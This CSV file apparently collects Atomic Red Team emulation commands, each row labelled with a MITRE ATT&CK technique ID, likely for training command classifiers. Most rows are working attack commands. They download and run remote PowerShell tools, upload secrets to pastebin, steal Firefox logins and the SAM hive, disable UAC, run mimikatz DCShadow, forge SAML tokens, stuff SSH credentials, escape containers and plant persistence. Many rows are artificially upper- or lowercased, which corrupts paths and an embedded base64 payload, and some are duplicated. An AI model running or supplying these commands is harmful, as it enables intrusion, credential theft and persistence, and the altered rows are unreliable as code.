mitre_id,command
T1025,"POWERSHELL.EXE -C ""GET-VOLUME | WHERE-OBJECT {$_.DRIVETYPE -EQ 'REMOVABLE'} | FOREACH-OBJECT { GET-CHILDITEM -PATH ($_.DRIVELETTER + ':\*') -RECURSE -INCLUDE '*.DOC*','*.XLS*','*.TXT','*.PDF' -ERRORACTION SILENTLYCONTINUE | FOREACH-OBJECT {WRITE-OUTPUT $_.FULLNAME} } ; IF (-NOT (GET-VOLUME | WHERE-OBJECT {$_.DRIVETYPE -EQ 'REMOVABLE'})) { WRITE-OUTPUT 'NO REMOVABLE MEDIA.' }"""
T1553,"sudo security add-trusted-cert -d -r trustroot -k ""/library/keychains/system.keychain"" ""#{cert_filename}"" # id_7197"
T1505,"$termsrvdll = ""c:\windows\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path $termsrvdll -destination ""$home\atomictest.dll"" $newservicedll = ""$home\atomictest.dll"" $registrypath = ""hklm:\system\currentcontrolset\services\termservice\parameters"" # check if the registry key exists if (test-path -path $registrypath) { # modify the servicedll value in the registry set-itemproperty -path $registrypath -name ""servicedll"" -value $newservicedll write-host ""servicedll value in the registry has been updated to: $newservicedll"" } else { write-host ""registry key not found. make sure the 'termservice\parameters' key exists."" } # id_1961"
T1137,reg.exe add hkcu\software\microsoft\office\#{outlook_version}\outlook\webview\#{outlook_folder} /v url /t reg_sz /d #{url} /f # id_4552
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1555,"$profile = (gci -filter ""*default-release*"" -path $env:appdata\mozilla\firefox\profiles\).fullname copy-item $profile\key4.db -destination ""pathtoatomicsfolder\..\externalpayloads"" > $null copy-item $profile\logins.json -destination ""pathtoatomicsfolder\..\externalpayloads"" > $null remove-item $profile\key4.db > $null remove-item $profile\logins.json > $null copy-item ""$env:pathtoatomicsfolder\t1555.003\src\key4.db"" -destination $profile\ > $null copy-item ""$env:pathtoatomicsfolder\t1555.003\src\logins.json"" -destination $profile\ > $null cd ""$env:pathtoatomicsfolder\t1555.003\bin"" """"|.\browsercollector.exe   "
T1518,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct # id_2077
T1087,username=$(id -u -n) && lsof -u $username
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"" # id_3972"
T1014,sudo modprobe #{rootkit_name}  
T1564,start-process #{powershell_command} # id_8322
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystem.ps1')  
T1651,"import-module ""pathtoatomicsfolder/t1651/src/t1651-1/awsssmattack.ps1"" -force $access_key = ""#{access_key}"" $secret_key = ""#{secret_key}"" $session_token = ""#{session_token}"" $aws_profile = ""#{profile}"" $region = ""#{region}"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder/t1651/src/t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") # id_1531"
T1558,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex(iwr https://raw.githubusercontent.com/empireproject/empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/invoke-kerberoast.ps1 -usebasicparsing) invoke-kerberoast | fl 
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1072,# deploy 7-zip using chocolatey choco install -y 7zip
T1654,wevtutil enum-logs  
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1580,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1033,"cmd.exe /c whoami wmic useraccount get /all quser /server:""#{computer_name}"" quser qwinsta.exe /server:#{computer_name} qwinsta.exe for /f ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""active disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt @for /f %n in (computers.txt) do @for /f ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""active disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt # id_8012"
T1046,"python ""#{filename}"" -i #{host_ip}"
T1074,"invoke-webrequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1074.001/src/discovery.bat"" -outfile #{output_file}"
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive 
T1217,dir /s /b %userprofile%\favorites
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"" "
T1612,DOCKER BUILD -T T1612 $PATHTOATOMICSFOLDER/T1612/SRC/ DOCKER RUN --NAME T1612_CONTAINER --RM -D -T T1612 DOCKER EXEC T1612_CONTAINER ./TEST.SH
T1201,aws iam get-account-password-policy
T1571,ECHO QUIT | TELNET #{DOMAIN} #{PORT} EXIT 0
T1652,kextstat
T1037,"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmuy29tbw9uid4gl3rtcc9umtazny4wmdqucmmuy29tbw9ujykk'))\"""" | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common sudo chmod +x /etc/rc.common "
T1041,"IF(-NOT (TEST-PATH #{FILEPATH})){ 1..100 | FOREACH-OBJECT { ADD-CONTENT -PATH #{FILEPATH} -VALUE ""THIS IS LINE $_."" } } [SYSTEM.NET.SERVICEPOINTMANAGER]::EXPECT100CONTINUE = $FALSE $FILECONTENT = GET-CONTENT -PATH #{FILEPATH} INVOKE-WEBREQUEST -URI #{DESTINATION_URL} -METHOD POST -BODY $FILECONTENT -DISABLEKEEPALIVE"
T1090,"[ ""$(uname)"" = 'freebsd' ] && sysrc tor_enable=""yes"" && service tor start || sudo systemctl start tor"
T1221,"START ""#{DOCX_FILE}"""
T1652,kextstat # id_2332
T1110,"cp ""$pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1124,net time \\#{computer_name} w32tm /tz # id_6186
T1547,"IF (!(TEST-PATH ""$PATHTOATOMICSFOLDER\T1547.001\SRC\SESSIONMANAGERBACKUP.REG"")) { REG.EXE EXPORT ""HKLM\SYSTEM\CURRENTCONTROLSET\CONTROL\SESSION MANAGER"" ""$PATHTOATOMICSFOLDER\T1547.001\SRC\SESSIONMANAGERBACKUP.REG"" /Y } SET-ITEMPROPERTY -PATH ""HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\SESSION MANAGER"" -NAME ""BOOTEXECUTE"" -VALUE ""#{REGISTRY_VALUE}"" -TYPE MULTISTRING"
T1047,"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create #{process_to_execute}"
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"" "
T1548,reg.exe add hklm\software\microsoft\windows\currentversion\policies\system /v enablelua /t reg_dword /d 0 /f
T1543,sudo cp #{script_location} #{script_destination} sudo touch /private/var/db/emondclients/#{empty_file} # id_9989
T1014,"sudo modprobe #{rootkit_name} ping -c 10 localhost >/dev/null & targetpid=""$!"" ps $targetpid kill -31 $targetpid ps $targetpid || echo ""process ${targetpid} hidden"" # id_5627"
T1614,localectl status
T1053,"$action = new-scheduledtaskaction -execute ""calc.exe"" $trigger = new-scheduledtasktrigger -atlogon $user = new-scheduledtaskprincipal -groupid ""builtin\administrators"" -runlevel highest $set = new-scheduledtasksettingsset $object = new-scheduledtask -action $action -principal $user -trigger $trigger -settings $set register-scheduledtask atomictask -inputobject $object "
T1040,tcpdump -c 5 -nnni #{interface} tshark -c 5 -i #{interface}
T1059,#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}   
T1620,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive # id_3120
T1560,"$appdata=""$env:userprofile\appdata"" $copy=""#{destination_folder}"" $zip=""#{zip_file_path}"" if (test-path $copy) { remove-item $copy -recurse -force } new-item -itemtype directory -path $copy | out-null get-childitem $appdata -recurse -force | foreach-object { $rel = $_.fullname.substring($appdata.length + 1) $dest = join-path $copy $rel if ($_.psiscontainer) { new-item -itemtype directory -path $dest -force | out-null } else { copy-item $_.fullname -destination $dest -force -erroraction silentlycontinue } } add-type -assemblyname system.io.compression.filesystem [system.io.compression.zipfile]::createfromdirectory($copy, $zip, [system.io.compression.compressionlevel]::optimal, $false)"
T1578,az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"""
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-beacon.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime} # id_8512"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""  "
T1036,COPY %SYSTEMROOT%\SYSTEM32\CMD.EXE %SYSTEMROOT%\TEMP\LSASS.EXE %SYSTEMROOT%\TEMP\LSASS.EXE /B
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"" # id_1012"
T1003,reg save HKLM\SAM C:\Users\Public\registry.tmp
T1053,"echo ""#{command}"" > /etc/cron.d/#{cron_script_name} # id_8489"
T1207,"# STARTING FAKE DC SERVER, AS SYSTEM (REQUIRED) $DC_OUTPUT_FILE = ""PATHTOATOMICSFOLDER\..\EXTERNALPAYLOADS\ART-T1207-MIMIKATZ-DC.LOG"" REMOVE-ITEM $DC_OUTPUT_FILE -ERRORACTION IGNORE $MIMIKATZPARAM =""`""LOG $DC_OUTPUT_FILE`"" `""LSADUMP::DCSHADOW /OBJECT:#{OBJECT} /ATTRIBUTE:#{ATTRIBUTE} /VALUE:#{VALUE}`"" `""EXIT`"""" $DC = START-PROCESS -FILEPATH CMD.EXE -VERB RUNAS -ARGUMENTLIST ""/C '#{PSEXEC_PATH}' /ACCEPTEULA -D -S #{MIMIKATZ_PATH} $MIMIKATZPARAM"" # WAIT FOR FAKE DC SERVER TO BE READY... START-SLEEP -SECONDS 5 # SERVER READY, SO TRIGGER REPLICATION (PUSH) AND WAIT UNTIL IT FINISHED & ""#{MIMIKATZ_PATH}"" ""LSADUMP::DCSHADOW /PUSH"" ""EXIT"" WRITE-HOST ""`NWAITING FOR FAKE DC SERVER TO RETURN"" WAIT-PROCESS $DC WRITE-HOST ""`NOUTPUT FROM FAKE DC SERVER:"" GET-CONTENT $DC_OUTPUT_FILE START-SLEEP 1 # WAIT A LITTLE UNTIL THE FILE IS NOT LOCKED ANYMORE SO WE CAN ACTUALLY DELETE IT REMOVE-ITEM $DC_OUTPUT_FILE -ERRORACTION IGNORE WRITE-HOST ""END OF DCSHADOW"""
T1021,"reg add ""hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v userauthentication /d 0 /t reg_dword /f"
T1485,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name}
T1005,"cd $home curl -o #{remote_url}/art curl -o #{remote_url}/gta.db curl -o #{remote_url}/sqlite_dump.sh chmod +x sqlite_dump.sh find . ! -executable -exec bash -c 'if [[ ""$(head -c 15 {} | strings)"" == ""sqlite format 3"" ]]; then echo ""{}""; ./sqlite_dump.sh {}; fi' \;"
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome""   "
T1016,ipconfig /all netsh interface show interface arp -a nbtstat -n net config  
T1039,"copy-item -path ""\\#{remote}\c$\#{share_file}"" -destination ""$env:temp\#{local_file}"""
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id"" # id_1327"
T1059,"write-host ""remote download of sharphound.ps1 into memory, followed by execution of the script"" -foregroundcolor cyan iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/bloodhoundad/bloodhound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/ingestors/sharphound.ps1'); invoke-bloodhound -outputdirectory $env:temp start-sleep 5 # id_7352"
T1219,"invoke-webrequest -outfile c:\users\$env:username\desktop\anydesk.exe https://download.anydesk.com/anydesk.exe $file1 = ""c:\users\"" + $env:username + ""\desktop\anydesk.exe"" start-process $file1 /s;"
T1114,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file}   "
T1611,"echo ""current user: #{username}"" sudo -u docker_user sh -c ""sudo docker run -v /:/mnt --rm --name t1611_privesc -it alpine chroot /mnt id""   "
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"" "
T1115,"dir | clip echo ""t1115"" > %temp%\t1115.txt clip < %temp%\t1115.txt # id_5981"
T1123,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\microphone\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1018,netstat -r | grep default # id_2083
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{bat_path}`"" for output as #1`n write #1, `""calc.exe`""`n close #1`n a = shell(`""cmd.exe /c #{bat_path} `"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct #{ms_product} # id_7246"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_2247"
T1609,"docker build -t t1609 $pathtoatomicsfolder/t1609/src/ docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh docker exec -i t1609_container bash -c ""cat /tmp/output.txt"" # id_7836"
T1098,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1615,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') gpoaudit -noninteractive -consoleoutput
T1489,SC.EXE STOP #{SERVICE_NAME}
T1071,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') start-dnscat2 -domain #{domain} -dnsserver #{server_ip}
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" # id_9045"
T1553,"$cert = import-certificate -filepath #{pfx_path} -certstorelocation cert:\localmachine\my move-item -path $cert.pspath -destination ""cert:\localmachine\root"""
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1105,c:\windows\system32\bitsadmin.exe /transfer #{bits_job_name} /priority high #{remote_file} #{local_path}
T1546,"$filterargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=new-ciminstance -namespace root/subscription -classname __eventfilter -property $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; commandlinetemplate=""$($env:systemroot)\system32\notepad.exe"";} $consumer=new-ciminstance -namespace root/subscription -classname commandlineeventconsumer -property $consumerargs $filtertoconsumerargs = @{ filter = [ref] $filter; consumer = [ref] $consumer; } $filtertoconsumerbinding = new-ciminstance -namespace root/subscription -classname __filtertoconsumerbinding -property $filtertoconsumerargs"
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""#{azure_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{azure_username}"", $pword try { connect-azuread -credential $credential -erroraction stop > $null } catch { write-host ""error: azuread could not connect"" exit 1 } try { $domain = get-azureaddomain -name ""#{domain_name}"" } catch { write-host ""error: domain """"#{domain_name}"""" not found"" exit 1 } if (-not $domain.isverified) { write-host ""error: domain """"#{domain_name}"""" not verified"" exit 1 } if ($domain.authenticationtype -eq ""federated"") { write-host ""error: domain """"#{domain_name}"""" already federated. try with a different domain or re-create it before."" exit 1 } $at = get-aadintaccesstokenforaadgraph -credentials $credential if (-not $at) { write-host ""error: aadinternals could not connect"" exit 1 } $new = convertto-aadintbackdoor -accesstoken $at -domainname ""#{domain_name}"" if ($new) { write-host ""federation successfully added to azure ad"" write-host $new } else { write-host ""the federation setup failed"" } write-host ""end of federation configuration."" # id_2299"
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"" # id_2437"
T1611,"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=never -ti --rm --image alpine --overrides '{""spec"":{""hostpid"": true, ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=/proc/1/ns/mnt"",""--"",""/bin/bash""],""stdin"": true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}' # id_9732"
T1550,"""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}"" # id_2901"
T1040,TCPDUMP -C 5 -NNNI #{INTERFACE} TSHARK -C 5 -I #{INTERFACE}
T1619,"try{$response = invoke-webrequest ""https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}"" -method ""get""} catch [system.net.webexception] {if($_.exception.response -ne $null) {$response = $_.exception.response.getresponsestream() $readresponse = new-object system.io.streamreader($response) $readresponse.basestream.position = 0 $responsebody = $readresponse.readtoend()} else {$responsebody = ""the storage account could not be anonymously accessed.""}} ""response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody"" | out-file -filepath #{output_file} -append"
T1090,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat"""
T1578,gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone} # id_6909
T1039,copy \\#{remote}\c$\#{share_file} %temp%\#{local_file}
T1486,echo t1486 - purelocker ransom note > %userprofile%\desktop\your_files.txt # id_2380
T1072,# deploy 7-zip using chocolatey choco install -y 7zip
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_5723"
